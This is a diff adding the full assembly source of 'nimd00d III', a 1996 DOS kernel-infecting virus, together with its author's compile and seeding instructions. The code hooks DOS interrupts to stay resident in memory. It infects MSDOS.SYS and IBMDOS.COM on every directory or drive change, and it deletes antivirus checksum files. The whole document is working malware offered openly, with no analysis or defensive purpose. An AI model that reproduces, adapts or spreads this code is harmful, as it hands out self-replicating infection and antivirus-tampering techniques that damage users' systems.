@@ -1,0 +1,671 @@
+;****************************************************************************
+; Virus name    : nimd00d III
+; Author        : Nimrood The Necromancer  [pain]
+; Origin        : United States of America, January 17, 1996
+; Compiling     : TASM NIM3.ASM /M3
+;                 TLINK NIM3.OBJ /X
+;                 EXE2NIM NIM3
+; Installing    : Before you compile, load MSDOS.SYS into debug, press R, and
+;                 copy down the first three bytes and the value in the CX
+;                 register.  Put the three bytes in the OLD_THREE variable
+;                 at the end of the virus then compile.  Take the .BIN file
+;                 and append it to the MSDOS.SYS file with:
+;                 COPY /B MSDOS.SYS+NIM3.BIN MSDOS.SYS /Y
+;                 Load the new MSDOS.SYS file into debug and start assembling
+;                 at 100h.  Make a near call to the value that was in CX plus
+;                 100h.  Press enter a couple times and then (W)rite the file
+;                 back to disk.  For example:
+;                 A:\>DEBUG MSDOS.SYS
+;                 -R
+;                 AX=0000  BX=0000  CX=94FA  DX=0000  SP=FFFE  BP=0000......
+;                 DS=0C8C  ES=0C8C  SS=0C8C  CS=0C8C  IP=0100   NV UP EI....
+;                 0C8C:0100 E9747C        JMP 7D77
+;                 -Q
+;                 <compile the virus with the three bytes above in OLD_THREE,
+;                 and add 100h to the value in CX>
+;                 A:\>COPY /B MSDOS.SYS+NIM3.BIN MSDOS.SYS /Y
+;                 A:\>DEBUG MSDOS.SYS
+;                 -A100
+;                 0C8C:0100 CALL 95FA
+;                 0C8C:0103
+;                 -W
+;                 Writing 09748 bytes
+;                 -Q
+; Targets       : MSDOS.SYS & IBMDOS.COM files
+; Size          : 587 bytes
+; Polymorphic   : No
+; Encryption    : No
+; Stealth       : No
+; Tunneling     : No 
+; Retro         : No
+; Antiheuristics: No
+; Greets        : Metabolis, DefJeff, Qark, Quantum, Retro, Antigen,
+;                 ShadSeek, and all the other freaks I missed! =)
+;                 Thanks to case0 and kdkd for their input.
+
+; Future Features/Plans:
+;    - might add encryption if i see a need
+;    - heh.. write a txt file and share what i've learned ;)
+
+; What the hell happened to the weekend?!  I missed the whole damn thing!
+; -Nimrood The Necromancer [pain]
+; tfu.bbs@sid.net
+;****************************************************************************
+.model tiny
+.code
+.radix 16
+     org 0
+;****************************************************************************
+;                        EQUs
+;****************************************************************************
+SIZE_BYTES = endv-nimd00d3
+SIZE_PARAS = (endv-nimd00d3+1e)/10
+;****************************************************************************
+;                        Start of Virus
+;****************************************************************************
+nimd00d3:
+
+;get orginal starting point
+
+     pop bx
+     sub bx,3
+     push bx                            ;save for RETN 
+
+;save the registers we destroy so the system doesn't hang
+
+     push si di ds es     
+
+;get delta offset and replace the old three bytes of host
+
+     push cs cs
+     pop es ds
+     mov di,bx
+     mov si,offset old_three
+     call delta
+delta:
+     pop bx
+     sub bx,(delta-nimd00d3)
+     add si,bx
+     movsw
+     movsb
+
+;move into memory temporarily
+
+     mov ax,8c00
+     mov es,ax
+     mov si,bx
+     xor di,di
+     push di
+     mov cx,SIZE_BYTES
+     rep movsb
+
+;initialize virus variables - if you don't do this, the virus will not work
+;after the first boot after the first infection. =)
+
+     mov byte ptr [es:is_CD21],0
+     mov byte ptr [es:moved],0
+
+;get current i1 vector
+
+     pop ds
+     mov si,1*4
+     lodsw
+     mov [es:i1_offset],ax
+     lodsw
+     mov [es:i1_segment],ax
+
+;set i1 vector to our handler
+
+     mov [si-2],es
+     mov word ptr [si-4],offset int_1
+
+;turn on the processor's instruction step interrupt
+
+     pushf
+     pop ax
+     or ax,100
+     push ax
+     popf
+
+;restore registers we saved and return to host
+
+     pop es ds di si
+     retn
+sig    db '[nimd00d III]'
+author db ' by ntn',0
+;****************************************************************************
+;                        Interrupt 1h Handler
+;****************************************************************************
+int_1:
+
+;set BP up so we can read the stack, and save the registers we use
+
+     push bp
+     mov bp,sp
+     push ax si ds
+
+;DS:SI points to the instuction at the return address on the stack. check and
+;see if the next instruction is an INT 21h
+
+     lds si,[bp+2]
+     cmp word ptr [si],21cd
+     jnz exit_i1
+
+;we know an INT 21 is the next instruction, so let's see if it is going to be
+;one of the functions we need to capture to grab some memory. (func 4b00,
+;load and EXECute, or func. 4b03, load overlay)  this will be the first EXEC
+;call dos makes, so it will either be a 4b03 for loading device drivers, or
+;be 4b00 to load command.com if there are no device drivers to load.
+
+     cmp ah,4bh
+     jnz exit_i1
+     or al,al
+     jz not_ovrlay_4b
+
+;on function 4b03, ES:BX points to the segment to load the overlay into. we
+;want to save this value for later.
+
+     mov ax,word ptr es:[bx]
+     mov [cs:loadseg],ax
+
+;save the first byte of the next instruction after the INT 21 for later.
+;then move the byte CCh (INT 03h) so it is the next instruction executed
+;after the INT 21.
+
+     mov al,byte ptr [si+2]
+     mov byte ptr [cs:endv+3],al
+     mov byte ptr [si+2],0cc
+
+;save original i3 vector and replace it with our handler
+
+     xor ax,ax
+     mov ds,ax
+     mov si,3*4
+     lodsw
+     mov [cs:i3_offset],ax
+     lodsw
+     mov [cs:i3_segment],ax
+     mov word ptr [si-4],offset int_3
+     mov [si-2],cs
+unchain_i1:
+
+;restore the original i1 handler
+
+     db 0b8                                  ;opcode for MOV AX,imed./16bit
+     i1_offset dw 0
+     mov [ds:1*4],ax
+     db 0b8
+     i1_segment dw 0
+     mov [ds:1*4+2],ax
+     jmp exit_i1
+not_ovrlay_4b:
+
+;we get here if there are no DEVICE= lines in CONFIG.SYS. this will
+;mostlikely be the execution of the command interperter. get the original
+;i21 vector and replace it with our i21 handler.
+
+     xor ax,ax
+     mov ds,ax
+     mov si,21*4
+     lodsw
+     mov [cs:i21_offset],ax
+     lodsw
+     mov [cs:i21_segment],ax
+     mov word ptr [si-4],offset int_21
+     mov [si-2],cs
+     jmp unchain_i1
+    
+exit_i1:
+
+;restore the registers we smashed, and return to caller.
+
+     pop ds si ax bp
+     iret
+;****************************************************************************
+;                        Interrupt 3h Handler
+;****************************************************************************
+int_3:
+
+;setup BP so we can read values we need on the stack, and save the registers
+;we destroy
+
+     push bp
+     mov bp,sp
+     push ax si ds
+
+;DS:SI points to the next instruction after the i3 opcode, CCh. get the first
+;byte of the instruction we replaced with CCh, and move it back. finally,
+;subtract 1 from the return address offset so that when this interrupt
+;returns control, it begins execution like normal at the original instruction
+
+     lds si,[bp+2]
+     mov al,byte ptr [cs:endv+3]
+     mov [si-1],al
+     dec byte ptr [bp+2]
+     mov ax,[cs:loadseg]
+     mov ds,ax
+     mov si,[ds:6]
+     mov [cs:strat_call],si
+     lodsw
+     mov [cs:endv+3],ax
+     lodsw
+     mov [cs:endv+5],ax
+     lodsb
+     mov [cs:endv+7],al
+     mov byte ptr [si-5],0ea
+     mov word ptr [si-4],offset strategy
+     mov [si-2],cs
+     mov si,[ds:8]
+     mov [cs:init_call],si
+     lodsw
+     mov [cs:endv+8],ax
+     lodsw
+     mov [cs:endv+0a],ax
+     lodsb
+     mov [cs:endv+0c],al
+     mov byte ptr [si-5],0ea
+     mov word ptr [si-4],offset interrupt
+     mov [si-2],cs
+     xor ax,ax
+     mov ds,ax
+     db 0b8
+     i3_offset dw 0
+     mov [ds:3*4],ax
+     db 0b8
+     i3_segment dw 0
+     mov [ds:3*4+2],ax
+     pop ds si ax bp
+     iret
+strategy:
+
+;save the request header address
+
+     mov word ptr [cs:endv+0d],bx
+     mov word ptr [cs:endv+0f],es
+     push ax si ds
+     mov si,[cs:loadseg]
+     mov ds,si
+     mov si,[cs:strat_call]
+     mov ax,[cs:endv+3]
+     mov [si],ax
+     mov ax,[cs:endv+5]
+     mov [si+2],ax
+     mov al,[cs:endv+7]
+     mov [si+5],al
+     pop ds si ax
+     db 0ea
+     strat_call dw 0
+     loadseg dw 0
+     init_call dw 0
+interrupt:
+     mov [cs:endv+3],ax
+     push cs
+     mov ax,offset init_ret
+     push ax
+     
+     mov ax,[cs:init_call]
+     mov [cs:init_off],ax
+     mov ax,[cs:loadseg]
+     mov [cs:init_seg],ax
+     mov ax,[cs:endv+3]
+     db 0ea
+     init_off dw 0
+     init_seg dw 0
+init_ret:
+
+;save registers we smash, including flags
+
+     pushf
+     push ax bx cx si di ds es
+
+;point to the request header and round up the end-of-driver address to the
+;next paragraph.
+
+     les bx,dword ptr [cs:endv+3]
+     add word ptr es:[bx+0e],0f
+
+;calculate our new memory segment
+
+     mov ax,es:[bx+0e]
+     mov cl,4
+     shr ax,cl
+     mov cx,es:[bx+10]
+     add cx,ax
+     push cx
+
+;add virus size to the end-of-driver address to allocate memory for virus
+
+     add ax,offset endv+9
+     adc cx,0
+     mov es:[bx+0e],ax
+     mov es:[bx+10],cx
+
+;copy the virus to our new segment
+
+     pop es
+     push cs
+     pop ds
+     xor si,si
+     mov di,si
+     push si
+     cld
+     mov cx,SIZE_BYTES
+     rep movsb
+
+;remind ourself we have moved, and capture i21
+
+     inc byte ptr [es:i21_hook]
+     pop ds
+     mov si,21*4
+     lodsw
+     mov [es:i21_offset],ax
+     lodsw
+     mov [es:i21_segment],ax
+     mov word ptr [si-4],offset int_21
+     mov [si-2],es
+
+;restore smashed registers and return to DOS
+
+     pop es ds di si cx bx ax
+     popf
+     retf
+;****************************************************************************
+;                        Interrupt 21h Handler
+;****************************************************************************
+int_21:
+
+;check to see if there are any calls we should be intercepting
+
+     cmp ah,4bh
+     jz alloc_mem
+     cmp ah,3bh
+     jz chdir
+     cmp ah,0e
+     jz chdrv
+;*********** debug code to see what segment we finally moved to
+;     cmp ax,0d00dh
+;     jnz exit_i21
+;     mov ax,cs
+;     iret
+;*********** debug code to see what segment we finally moved to
+exit_i21:
+     db 0ea
+     i21_offset dw 0
+     i21_segment dw 0
+
+;grab some memory so we can get out of 8c00 into a safe area
+
+alloc_mem:
+     cmp byte ptr [cs:moved],1               ;have we moved already?
+     jz exit_i21
+     push ax bx cx si di ds es
+
+;request (endv-nimd00d3+1e)/10 bytes of memory for ourself so we can get out
+;of this unprotected memory area
+
+     mov ah,48
+     mov bx,SIZE_PARAS
+     int 21
+     jnc move_virus
+     jmp mem_bomb
+move_virus:
+
+;alright, we got some memory to move to, so lets do it.  AX=our new chunk
+;of memory
+
+     mov es,ax
+     push cs
+     pop ds
+     xor si,si
+     mov di,si
+     push si
+     mov cx,SIZE_BYTES
+     cld
+     rep movsb
+
+;remind ourself that we have now moved, and change the IVT to reflect our
+;i21's new location in memory.
+
+     inc byte ptr [es:moved] 
+     pop ds
+     mov [ds:21*4+2],es
+
+;restore registers destroyed and send the program on it's way
+
+mem_bomb:
+     pop es ds di si cx bx ax
+     jmp exit_i21
+
+;watch for checksum files to delete and kernel files to infect
+;while a program (or user) is moving around on his system
+
+chdir:
+chdrv:
+
+;go ahead and make the call to DOS so we can do our dirty work
+
+     pushf
+     call dword ptr [cs:i21_offset]
+     jnc cont_chdir
+     retf 2
+    
+cont_chdir:
+
+;save the flags and registers for the return to the caller
+
+     pushf
+     push ax bx cx dx si di ds es
+
+;search and destroy checksum files in this new directory/drive
+
+     call kill_checksums
+
+;try to infect any kernels that may be in this directory/drive
+
+     mov dx,offset msdos
+     call try_infect
+     mov dx,offset ibmdos
+     call try_infect
+
+;return safe and sound to the orignal caller
+
+chdir_exit:
+     pop es ds di si dx cx bx ax
+     popf
+     retf 2
+     
+;****************************************************************************
+;              Procedure to kill AV checksum files - w00 h00
+;****************************************************************************
+kill_checksums:
+     push cs
+     pop ds
+
+;point DS:DX at CHKLIST.MS and try to delete it if it exists
+
+     mov dx,offset kill_msav
+     call kill_ds_dx
+
+;point DS:DX at ANTI-VIR.DAT and try to delete it if it exists
+
+     mov dx,offset kill_tbav
+     call kill_ds_dx
+
+;point DS:DX at MSAV.CHK and try to delete it if it exists
+
+     mov dx,offset kill_msav2
+     call kill_ds_dx
+
+;point DS:DX at CHKLIST.CPS and try to delete it if it exists
+
+     mov dx,offset kill_cps
+     call kill_ds_dx
+     ret
+kill_ds_dx:
+
+;clear all of DS:DX's file attributes
+
+     mov ax,4301
+     xor cx,cx
+     int 21
+     jc crapola
+
+;now try and delete the little pest
+
+     mov ah,41
+     int 21
+crapola:
+     ret
+;****************************************************************************
+;                       Procedure to infect kernel
+;****************************************************************************
+infect_dos:
+
+;read the first three bytes of kernel
+
+     xchg ax,bx
+     mov ah,3f
+     mov cx,3
+     mov dx,offset old_three
+     int 21
+
+;check to see if this is a healthy kernel file.  an infectable kernel
+;file should start with the JMP opcode.  if it's not there, then it's 
+;already infected or probably a Windows 95 MSDOS.SYS file.
+
+     cmp byte ptr [old_three],0e9
+     jnz exit_infect
+     
+
+;close the file handle we used to test if kernel existed
+
+     mov ah,3e
+     int 21
+
+;grab files attributes and put them on the stack for later
+
+     mov ax,4300
+     mov dx,[file_to_open]
+     int 21
+     push cx
+
+;clear files attributes so we can reopen the kernel in write mode
+
+     mov ax,4301
+     xor cx,cx
+     int 21
+
+;reopen kernel in write mode
+
+     mov ax,3d02
+     mov dx,[file_to_open]
+     int 21
+     xchg ax,bx
+
+;get file's date and time and push it onto stack.
+
+     mov ax,5700
+     int 21
+     push cx dx
+
+;get file size
+
+     mov ax,4202
+     xor cx,cx
+     cwd
+     int 21
+     
+
+;construct our CALL nimd00d3 to write to the kernel
+
+     push ax
+     sub ax,3
+     mov byte ptr [endv],0e8
+     mov word ptr [endv+1],ax
+
+;move to the start of the file
+
+     mov ax,4200
+     xor cx,cx
+     cwd
+     int 21
+
+;write the CALL nimd00d3 to the kernel
+
+     mov ah,40
+     mov cx,3
+     mov dx,offset endv
+     int 21
+
+;move to the end of the kernel so we can append the virus
+
+     mov ax,4200
+     xor cx,cx
+     pop dx
+     int 21
+
+;append the virus to the kernel
+
+     mov ah,40
+     mov cx,SIZE_BYTES
+     xor dx,dx
+     int 21
+
+;restore file's date and time
+
+     mov ax,5701
+     pop dx cx
+     int 21
+
+;close the file
+
+     mov ah,3e
+     int 21
+
+;restore file's attributes and return to caller
+
+     mov ax,4301
+     pop cx
+     mov dx,[file_to_open]
+     int 21
+     ret
+exit_infect:
+
+;close the file and return to caller
+
+     mov ah,3e
+     int 21
+     ret
+;****************************************************************************
+;              Procedure to test for a kernel's presence
+;****************************************************************************
+try_infect:
+
+;open file name passed in DS:DX to see if it exists.  if it exists, call
+;infection routine
+
+     mov ax,3d00
+     mov [file_to_open],dx
+     int 21
+     jc exit_find
+     call infect_dos
+exit_find:
+     ret
+;****************************************************************************
+;                        Virus Data Stuffs
+;****************************************************************************
+kill_msav db 'CHKLIST.MS',0
+kill_tbav db 'ANTI-VIR.DAT',0
+kill_msav2 db 'MSAV.CHK',0
+kill_cps db 'CHKLIST.CPS',0
+msdos db 'MSDOS.SYS',0
+ibmdos db 'IBMDOS.COM',0
+old_three db 0e9,74,7c
+file_to_open dw 0
+i21_hook db 0
+moved db 0
+is_CD21 db 0
+loadseg dw 0
+endv:
+end nimd00d3
+
